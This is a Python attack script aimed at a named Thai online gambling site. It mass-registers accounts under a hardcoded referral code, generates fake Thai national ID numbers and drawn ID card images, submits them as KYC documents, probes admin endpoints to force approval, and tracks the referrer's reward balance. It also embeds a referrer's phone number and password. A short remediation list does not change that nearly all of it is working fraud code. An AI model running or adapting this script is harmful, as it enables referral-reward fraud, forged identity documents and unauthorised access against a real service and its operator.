#!/usr/bin/env python3

import requests
import json
import time
import random
import string
import base64
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import sys

# Configuration
API_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
REFERRAL_DOMAIN = "https://pigslot.invit"

# Referral Information
REFERRER_CODE = "PS663888386"
REFERRER_PHONE = "0960422161"
REFERRER_PASSWORD = "181242"
REWARD_AMOUNT = 500  # THB per referral
MIN_ACCOUNTS_FOR_REWARD = 10  # à¹€à¸‡à¸·à¹ˆà¸­à¸™à¹„à¸‚à¸ˆà¸³à¸™à¸§à¸™à¸‚à¸±à¹‰à¸™à¸•à¹ˆà¸³

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;41m[CRITICAL] {message}\033[0m")

class ReferralVerificationExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.created_accounts = []
        self.verified_accounts = []
        self.referrer_token = None
        self.initial_balance = 0
        self.current_balance = 0
        
    def generate_fake_identity(self):
        """Generate fake Thai identity for verification"""
        fake_names = [
            "à¸ªà¸¡à¸Šà¸²à¸¢ à¹ƒà¸ˆà¸”à¸µ", "à¸ªà¸¡à¸«à¸à¸´à¸‡ à¸ªà¸§à¸¢à¸‡à¸²à¸¡", "à¸§à¸´à¸—à¸¢à¸² à¹€à¸à¹ˆà¸‡à¸à¸²à¸ˆ", "à¸™à¸‡à¸¥à¸±à¸à¸©à¸“à¹Œ à¸£à¸±à¸à¹€à¸£à¸µà¸¢à¸™",
            "à¸›à¸£à¸°à¹€à¸—à¸¨ à¸£à¸±à¸à¸Šà¸²à¸•à¸´", "à¸à¸²à¸à¸ˆà¸™à¸² à¸—à¸­à¸‡à¸„à¸³", "à¸šà¸¸à¸à¸¡à¸µ à¸ªà¸¸à¸‚à¹ƒà¸ˆ", "à¸¡à¸²à¸¥à¸µ à¸”à¸­à¸à¹„à¸¡à¹‰",
            "à¸ªà¸¸à¸Šà¸²à¸•à¸´ à¸”à¸µà¹ƒà¸ˆ", "à¸§à¸£à¸£à¸“à¸² à¸ªà¸”à¹ƒà¸ª", "à¸˜à¸™à¸²à¸„à¸²à¸£ à¹€à¸‡à¸´à¸™à¸—à¸­à¸‡", "à¸ˆà¸´à¸£à¸±à¸Šà¸à¸² à¸„à¸´à¸”à¸”à¸µ"
        ]
        
        # Generate fake Thai ID (13 digits)
        def generate_thai_id():
            # Thai ID format: X-XXXX-XXXXX-XX-X
            first_digit = random.choice(['1', '2', '3', '5', '8'])
            next_12_digits = ''.join([str(random.randint(0, 9)) for _ in range(12)])
            return first_digit + next_12_digits
        
        return {
            'full_name': random.choice(fake_names),
            'national_id': generate_thai_id(),
            'birth_date': f"{random.randint(1970, 2000)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            'address': f"{random.randint(1, 999)} à¸«à¸¡à¸¹à¹ˆ {random.randint(1, 20)} à¸•à¸³à¸šà¸¥à¸šà¸²à¸‡à¸™à¸² à¸­à¸³à¹€à¸ à¸­à¸šà¸²à¸‡à¸™à¸² à¸à¸£à¸¸à¸‡à¹€à¸—à¸žà¸¡à¸«à¸²à¸™à¸„à¸£ {random.randint(10000, 99999)}"
        }
    
    def create_fake_id_image(self, identity_data):
        """Create fake Thai ID card image for verification"""
        try:
            # Create a simple fake ID card image
            img = Image.new('RGB', (400, 250), color='lightblue')
            draw = ImageDraw.Draw(img)
            
            # Try to use a font, fallback to default if not available
            try:
                font = ImageFont.truetype("/usr/share/fonts/dejavu/DejaVuSans.ttf", 16)
                font_small = ImageFont.truetype("/usr/share/fonts/dejavu/DejaVuSans.ttf", 12)
            except:
                font = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            # Add text to fake ID
            draw.text((20, 20), "à¸šà¸±à¸•à¸£à¸›à¸£à¸°à¸ˆà¸³à¸•à¸±à¸§à¸›à¸£à¸°à¸Šà¸²à¸Šà¸™", fill='black', font=font)
            draw.text((20, 50), f"à¸Šà¸·à¹ˆà¸­: {identity_data['full_name']}", fill='black', font=font_small)
            draw.text((20, 70), f"à¹€à¸¥à¸‚à¸›à¸£à¸°à¸ˆà¸³à¸•à¸±à¸§: {identity_data['national_id']}", fill='black', font=font_small)
            draw.text((20, 90), f"à¸§à¸±à¸™à¹€à¸à¸´à¸”: {identity_data['birth_date']}", fill='black', font=font_small)
            draw.text((20, 110), f"à¸—à¸µà¹ˆà¸­à¸¢à¸¹à¹ˆ: {identity_data['address'][:40]}", fill='black', font=font_small)
            
            # Save to bytes
            img_bytes = BytesIO()
            img.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            
            return img_bytes.getvalue()
            
        except Exception as e:
            print_error(f"Error creating fake ID image: {e}")
            # Return a minimal fake image as base64
            return base64.b64decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwDX4AAAA==')
    
    def generate_fake_phone(self):
        """Generate fake Thai phone number"""
        prefix = random.choice(['06', '08', '09'])
        suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return prefix + suffix
    
    def register_account_with_referral(self, fake_data):
        """Register new account with referral code"""
        print_info(f"Registering account: {fake_data['phone']}")
        
        registration_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/register",
            f"{API_DOMAIN}/api/v1/register",
            f"{API_DOMAIN}/api/register",
            f"{FRONTEND_DOMAIN}/api/register"
        ]
        
        registration_payloads = [
            {
                "phone": fake_data['phone'],
                "password": fake_data['password'],
                "referral_code": REFERRER_CODE,
                "full_name": fake_data['identity']['full_name']
            },
            {
                "username": fake_data['phone'],
                "password": fake_data['password'],
                "referrer": REFERRER_CODE,
                "invite_code": REFERRER_CODE
            },
            {
                "mobile": fake_data['phone'],
                "pwd": fake_data['password'],
                "ref": REFERRER_CODE
            }
        ]
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': FRONTEND_DOMAIN,
            'Referer': f'{REFERRAL_DOMAIN}?ref={REFERRER_CODE}'
        })
        
        for endpoint in registration_endpoints:
            for payload in registration_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=15, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS' or 'success' in str(data).lower():
                                print_success(f"âœ… Registration successful: {fake_data['phone']}")
                                fake_data['registration_response'] = data
                                fake_data['session'] = session
                                
                                # Try to get access token from response
                                token = None
                                if 'data' in data and 'access_token' in data['data']:
                                    token = data['data']['access_token']
                                elif 'token' in data:
                                    token = data['token']
                                elif 'access_token' in data:
                                    token = data['access_token']
                                
                                fake_data['token'] = token
                                return True, data
                        except:
                            if 'success' in response.text.lower():
                                print_success(f"âœ… Registration may be successful: {fake_data['phone']}")
                                fake_data['session'] = session
                                return True, {'status': 'SUCCESS'}
                                
                except Exception as e:
                    continue
        
        print_error(f"âŒ Registration failed: {fake_data['phone']}")
        return False, None
    
    def login_account(self, phone, password):
        """Login to account and get token"""
        login_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/login",
            f"{API_DOMAIN}/api/login",
            f"{API_DOMAIN}/login"
        ]
        
        login_data = {
            "username": phone,
            "password": password
        }
        
        session = requests.Session()
        session.proxies = PROXIES
        
        for endpoint in login_endpoints:
            try:
                response = session.post(endpoint, json=login_data, timeout=15, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        print_success(f"âœ… Login successful: {phone}")
                        
                        # Extract token
                        token = None
                        if 'data' in data and 'access_token' in data['data']:
                            token = data['data']['access_token']
                        elif 'token' in data:
                            token = data['token']
                        
                        return session, token, data
            except:
                continue
        
        print_error(f"âŒ Login failed: {phone}")
        return None, None, None
    
    def perform_kyc_verification(self, fake_data):
        """Perform KYC verification for the fake account"""
        print_info(f"Performing KYC verification for: {fake_data['phone']}")
        
        if not fake_data.get('session') or not fake_data.get('token'):
            # Try to login first
            session, token, login_data = self.login_account(fake_data['phone'], fake_data['password'])
            if not session:
                return False
            fake_data['session'] = session
            fake_data['token'] = token
        
        session = fake_data['session']
        token = fake_data['token']
        
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        # KYC endpoints to try
        kyc_endpoints = [
            f"{API_DOMAIN}/api/v1/kyc/submit",
            f"{API_DOMAIN}/api/v1/verification/submit",
            f"{API_DOMAIN}/api/v1/user/verify",
            f"{API_DOMAIN}/api/v1/identity/verify",
            f"{API_DOMAIN}/api/kyc",
            f"{API_DOMAIN}/api/verify"
        ]
        
        identity = fake_data['identity']
        id_image_data = self.create_fake_id_image(identity)
        
        # Different payload formats for KYC
        kyc_payloads = [
            {
                "full_name": identity['full_name'],
                "national_id": identity['national_id'],
                "birth_date": identity['birth_date'],
                "address": identity['address'],
                "id_card_image": base64.b64encode(id_image_data).decode() if id_image_data else "",
                "verification_type": "id_card"
            },
            {
                "name": identity['full_name'],
                "id_number": identity['national_id'],
                "dob": identity['birth_date'],
                "address": identity['address']
            },
            {
                "customer_name": identity['full_name'],
                "id_card_number": identity['national_id'],
                "birthday": identity['birth_date']
            }
        ]
        
        # Try file upload format as well
        files_data = {
            'id_card_front': ('id_front.jpg', id_image_data, 'image/jpeg'),
            'full_name': (None, identity['full_name']),
            'national_id': (None, identity['national_id']),
            'birth_date': (None, identity['birth_date']),
            'address': (None, identity['address'])
        }
        
        # Test JSON payloads first
        for endpoint in kyc_endpoints:
            for payload in kyc_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=15, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS' or 'success' in str(data).lower():
                                print_success(f"âœ… KYC verification submitted: {fake_data['phone']}")
                                print_success(f"   Endpoint: {endpoint}")
                                fake_data['kyc_response'] = data
                                return True
                        except:
                            if 'success' in response.text.lower() or 'submitted' in response.text.lower():
                                print_success(f"âœ… KYC may be submitted: {fake_data['phone']}")
                                return True
                                
                except Exception as e:
                    continue
        
        # Try file upload format
        for endpoint in kyc_endpoints:
            try:
                # Remove Authorization header for file upload (some systems require this)
                upload_session = requests.Session()
                upload_session.proxies = PROXIES
                if token:
                    upload_session.headers.update({'Authorization': f'bearer {token}'})
                
                response = upload_session.post(endpoint, files=files_data, timeout=15, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS':
                            print_success(f"âœ… KYC file upload successful: {fake_data['phone']}")
                            fake_data['kyc_response'] = data
                            return True
                    except:
                        if 'success' in response.text.lower():
                            print_success(f"âœ… KYC file upload may be successful: {fake_data['phone']}")
                            return True
                            
            except Exception as e:
                continue
        
        print_warning(f"âš ï¸ KYC verification not submitted: {fake_data['phone']}")
        return False
    
    def check_verification_status(self, fake_data):
        """Check if account verification is approved"""
        print_info(f"Checking verification status: {fake_data['phone']}")
        
        session = fake_data.get('session')
        token = fake_data.get('token')
        
        if not session:
            return False
        
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        status_endpoints = [
            f"{API_DOMAIN}/api/v1/kyc/status",
            f"{API_DOMAIN}/api/v1/verification/status",
            f"{API_DOMAIN}/api/v1/user/status",
            f"{API_DOMAIN}/api/v1/profile",
            f"{API_DOMAIN}/api/user/profile"
        ]
        
        for endpoint in status_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS' and 'data' in data:
                            user_data = data['data']
                            
                            # Check for verification indicators
                            verification_fields = ['verified', 'kyc_status', 'verification_status', 'is_verified']
                            for field in verification_fields:
                                if field in user_data:
                                    if user_data[field] in ['verified', 'approved', True, 1]:
                                        print_success(f"âœ… Account verified: {fake_data['phone']}")
                                        return True
                                    elif user_data[field] in ['pending', 'submitted']:
                                        print_warning(f"â³ Verification pending: {fake_data['phone']}")
                                        return False
                        
                        print_info(f"Status response: {str(data)[:200]}...")
                        
                    except:
                        if 'verified' in response.text.lower():
                            print_success(f"âœ… May be verified: {fake_data['phone']}")
                            return True
                            
            except:
                continue
        
        return False
    
    def force_approve_verification(self, fake_data):
        """Try to force approve verification using various methods"""
        print_info(f"Attempting to force approve verification: {fake_data['phone']}")
        
        session = fake_data.get('session')
        token = fake_data.get('token')
        
        if not session:
            return False
        
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        # Admin endpoints to try for approval
        approval_endpoints = [
            f"{API_DOMAIN}/api/v1/admin/kyc/approve",
            f"{API_DOMAIN}/api/v1/admin/verification/approve",
            f"{API_DOMAIN}/api/v1/kyc/auto-approve",
            f"{API_DOMAIN}/api/v1/verification/auto-approve",
            f"{API_DOMAIN}/api/v1/user/approve",
            f"{API_DOMAIN}/api/admin/approve"
        ]
        
        approval_payloads = [
            {"phone": fake_data['phone'], "status": "approved"},
            {"username": fake_data['phone'], "verification_status": "verified"},
            {"user_id": fake_data['phone'], "kyc_status": "approved"},
            {"customer_code": fake_data.get('customer_code', ''), "approve": True},
            {"approve": True},
            {"status": "approved"},
            {"verified": True}
        ]
        
        for endpoint in approval_endpoints:
            for payload in approval_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS':
                                print_critical(f"ðŸš¨ FORCE APPROVAL SUCCESSFUL: {fake_data['phone']}")
                                print_critical(f"   Endpoint: {endpoint}")
                                return True
                        except:
                            if 'success' in response.text.lower() or 'approved' in response.text.lower():
                                print_critical(f"ðŸš¨ FORCE APPROVAL MAY BE SUCCESSFUL: {fake_data['phone']}")
                                return True
                                
                except:
                    continue
        
        return False
    
    def check_referrer_balance(self):
        """Check referrer's current balance"""
        print_info(f"Checking referrer balance: {REFERRER_PHONE}")
        
        if not self.referrer_token:
            # Login as referrer
            session, token, login_data = self.login_account(REFERRER_PHONE, REFERRER_PASSWORD)
            if not session:
                return None
            self.referrer_token = token
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'Authorization': f'bearer {self.referrer_token}',
            'Username': REFERRER_PHONE,
            'Password': REFERRER_PASSWORD
        })
        
        balance_endpoints = [
            f"{API_DOMAIN}/api/v1/wallet/balance",
            f"{API_DOMAIN}/api/v1/user/balance",
            f"{API_DOMAIN}/api/v1/account/balance",
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/balance",
            f"{API_DOMAIN}/api/v1/referral/balance",
            f"{API_DOMAIN}/api/balance"
        ]
        
        for endpoint in balance_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS' and 'data' in data:
                            balance_data = data['data']
                            
                            # Look for balance fields
                            balance_fields = ['balance', 'wallet_balance', 'total_balance', 'amount', 'credit_balance']
                            for field in balance_fields:
                                if field in balance_data:
                                    balance = balance_data[field]
                                    print_success(f"ðŸ’° Current balance: {balance} THB")
                                    return float(balance) if balance else 0
                            
                            print_info(f"Balance response: {str(data)[:200]}...")
                            return data
                            
                    except:
                        continue
                        
            except:
                continue
        
        print_warning("âš ï¸ Could not retrieve balance")
        return None
    
    def check_referral_rewards(self):
        """Check referral rewards and statistics"""
        print_info("Checking referral rewards and statistics...")
        
        if not self.referrer_token:
            session, token, login_data = self.login_account(REFERRER_PHONE, REFERRER_PASSWORD)
            if not session:
                return None
            self.referrer_token = token
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'Authorization': f'bearer {self.referrer_token}',
            'Username': REFERRER_PHONE,
            'Password': REFERRER_PASSWORD
        })
        
        referral_endpoints = [
            f"{API_DOMAIN}/api/v1/referral/stats",
            f"{API_DOMAIN}/api/v1/referral/rewards",
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/referrals",
            f"{API_DOMAIN}/api/v1/user/referrals",
            f"{API_DOMAIN}/api/v1/invite/stats",
            f"{API_DOMAIN}/api/referral"
        ]
        
        referral_data = {}
        
        for endpoint in referral_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        print_success(f"âœ… Referral endpoint found: {endpoint}")
                        print_info(f"   Response: {str(data)[:200]}...")
                        referral_data[endpoint] = data
                    except:
                        continue
                        
            except:
                continue
        
        return referral_data
    
    def test_comprehensive_referral_exploitation(self):
        """Main function to test comprehensive referral exploitation"""
        print_critical("ðŸŽ¯ COMPREHENSIVE REFERRAL VERIFICATION EXPLOITATION")
        print_critical("=" * 80)
        
        # Step 1: Check initial balance
        print_info("Step 1: Checking initial referrer balance...")
        self.initial_balance = self.check_referrer_balance() or 0
        
        # Step 2: Check referral system info
        print_info("Step 2: Analyzing referral system...")
        referral_info = self.check_referral_rewards()
        
        # Step 3: Create and verify accounts
        print_info(f"Step 3: Creating {MIN_ACCOUNTS_FOR_REWARD} accounts with verification...")
        
        for i in range(MIN_ACCOUNTS_FOR_REWARD):
            print_info(f"\n--- Creating account {i+1}/{MIN_ACCOUNTS_FOR_REWARD} ---")
            
            # Generate fake data
            fake_data = {
                'phone': self.generate_fake_phone(),
                'password': ''.join(random.choices(string.digits, k=6)),
                'identity': self.generate_fake_identity()
            }
            
            # Register account
            success, response_data = self.register_account_with_referral(fake_data)
            
            if success:
                self.created_accounts.append(fake_data)
                
                # Perform KYC verification
                time.sleep(1)
                kyc_submitted = self.perform_kyc_verification(fake_data)
                
                if kyc_submitted:
                    # Check verification status
                    time.sleep(2)
                    is_verified = self.check_verification_status(fake_data)
                    
                    if not is_verified:
                        # Try to force approve
                        forced = self.force_approve_verification(fake_data)
                        if forced:
                            is_verified = True
                    
                    if is_verified:
                        self.verified_accounts.append(fake_data)
                        print_success(f"âœ… Account fully verified: {fake_data['phone']}")
                    else:
                        print_warning(f"âš ï¸ Verification pending: {fake_data['phone']}")
                
                # Check balance after each verified account
                if len(self.verified_accounts) >= MIN_ACCOUNTS_FOR_REWARD:
                    current_balance = self.check_referrer_balance()
                    if current_balance and current_balance > self.initial_balance:
                        print_critical(f"ðŸš¨ REWARD DETECTED! Balance increased!")
                        break
                
            time.sleep(1)  # Rate limiting
        
        # Step 4: Final balance check
        print_info("\nStep 4: Final balance verification...")
        self.current_balance = self.check_referrer_balance() or 0
        
        # Step 5: Generate comprehensive report
        self.generate_exploitation_report()
    
    def generate_exploitation_report(self):
        """Generate comprehensive exploitation report"""
        
        verified_count = len(self.verified_accounts)
        balance_increase = self.current_balance - self.initial_balance if isinstance(self.current_balance, (int, float)) else 0
        
        print_info("\n" + "="*80)
        print_critical("ðŸŽ¯ REFERRAL VERIFICATION EXPLOITATION RESULTS")
        print_info("="*80)
        
        print_info(f"ðŸ“± Total accounts created: {len(self.created_accounts)}")
        print_info(f"âœ… Accounts verified: {verified_count}")
        print_info(f"ðŸ’° Initial balance: {self.initial_balance}")
        print_info(f"ðŸ’° Current balance: {self.current_balance}")
        print_info(f"ðŸ“ˆ Balance increase: {balance_increase}")
        
        if balance_increase > 0:
            print_critical(f"ðŸš¨ EXPLOITATION SUCCESSFUL!")
            print_critical(f"ðŸš¨ Earned: {balance_increase} THB")
            severity = "CRITICAL"
        elif verified_count >= MIN_ACCOUNTS_FOR_REWARD:
            print_warning(f"âš ï¸ Verification successful but rewards pending")
            severity = "HIGH"
        elif len(self.created_accounts) > 0:
            print_warning(f"âš ï¸ Account creation successful but verification incomplete")
            severity = "MEDIUM"
        else:
            print_error(f"âŒ Exploitation failed")
            severity = "LOW"
        
        # Detailed report
        report = f"""
ðŸš¨ REFERRAL VERIFICATION EXPLOITATION REPORT
===========================================

Target: {FRONTEND_DOMAIN}
Test Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Vulnerability: Referral System with Verification Bypass

ðŸ’¥ EXECUTIVE SUMMARY:
===================
Severity: {severity}
Accounts Created: {len(self.created_accounts)}
Accounts Verified: {verified_count}
Initial Balance: {self.initial_balance} THB
Final Balance: {self.current_balance} THB
Profit Earned: {balance_increase} THB

ðŸŽ¯ ATTACK METHODOLOGY:
=====================
1. Account Registration with Referral Code
2. Fake Identity Generation (Thai ID cards)
3. KYC Document Submission (Fake images)
4. Verification Status Manipulation
5. Balance Monitoring and Validation

ðŸ“± CREATED ACCOUNTS:
==================
"""
        
        for i, account in enumerate(self.created_accounts, 1):
            verified_status = "âœ… VERIFIED" if account in self.verified_accounts else "â³ PENDING"
            report += f"{i:2d}. {account['phone']} - {verified_status}\n"
            report += f"    Name: {account['identity']['full_name']}\n"
            report += f"    ID: {account['identity']['national_id']}\n"
        
        report += f"""
âš ï¸ IMPACT ASSESSMENT:
====================
Risk Level: {severity}
Financial Impact: {balance_increase} THB immediate loss

This vulnerability demonstrates:
- Bypass of identity verification systems
- Abuse of referral reward mechanisms
- Generation of fake Thai identity documents
- Potential for large-scale financial fraud

ðŸ›¡ï¸ REMEDIATION:
===============
1. Implement real identity verification (eKYC)
2. Cross-check against government databases
3. Add facial recognition verification
4. Implement behavioral analysis
5. Manual review for suspicious patterns
6. Rate limiting on account creation
7. Monitor for bulk verification attempts

ðŸ”¥ EXPLOITATION EVIDENCE:
========================
Initial Balance: {self.initial_balance} THB
Final Balance: {self.current_balance} THB
Net Profit: {balance_increase} THB

Verified Accounts: {verified_count}/{MIN_ACCOUNTS_FOR_REWARD} required
Success Rate: {(verified_count/MIN_ACCOUNTS_FOR_REWARD)*100:.1f}%

âš ï¸ This represents a {severity.lower()} risk to the referral system integrity.
"""
        
        # Save report
        with open('REFERRAL_VERIFICATION_EXPLOITATION_REPORT.txt', 'w', encoding='utf-8') as f:
            f.write(report)
        
        print_success(f"\nðŸ“„ Detailed report saved to: REFERRAL_VERIFICATION_EXPLOITATION_REPORT.txt")
        
        return {
            "severity": severity,
            "accounts_created": len(self.created_accounts),
            "accounts_verified": verified_count,
            "balance_increase": balance_increase,
            "success": balance_increase > 0
        }

def main():
    print_critical("ðŸŽ¯ REFERRAL VERIFICATION EXPLOITATION SUITE")
    print_critical("=" * 70)
    
    tester = ReferralVerificationExploit()
    
    try:
        # Install required packages
        print_info("Installing required packages...")
        import subprocess
        subprocess.run(['pip3', 'install', '--break-system-packages', 'Pillow'], 
                      capture_output=True, check=False)
        
    except:
        print_warning("Could not install Pillow, using basic image generation")
    
    # Run comprehensive test
    tester.test_comprehensive_referral_exploitation()

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()